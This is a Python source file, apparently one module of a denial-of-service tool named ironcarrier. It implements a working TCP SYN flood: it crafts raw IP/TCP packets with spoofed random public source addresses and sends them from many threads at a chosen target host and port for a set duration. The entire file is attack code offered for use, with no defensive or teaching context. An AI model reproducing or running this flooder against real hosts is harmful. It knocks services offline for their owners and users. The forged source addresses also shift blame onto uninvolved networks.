#!/usr/bin/env python3
"""
SYN Flood Vector
TCP SYN flood with spoofed source IPs
"""

import socket
import struct
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """SYN flood attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.randomize_seq = kwargs.get('randomize_seq', True)
        self.randomize_window = kwargs.get('randomize_window', True)
        self.ttl = kwargs.get('ttl', 64)
        self._resolved_target = None
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _random_ip(self) -> str:
        first = random.choice([1, 2, 5, 10, 14, 23, 24, 31, 37, 41, 46, 49, 50, 56, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222])
        return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _build_packet(self) -> bytes:
        dst_ip = self._resolve_target()
        src_ip = self._random_ip()
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF) if self.randomize_seq else 0
        window = random.randint(1024, 65535) if self.randomize_window else 65535
        
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            src_port, self.port, seq, 0,
            (5 << 4), 0x02, window, 0, 0
        )
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 40,
            random.randint(0, 65535), 0x4000, self.ttl, 6, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        return ip_header + tcp_header
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), self.port)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                sock.sendto(self._build_packet(), dst)
                self.stats.add_packets(1, 40)
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
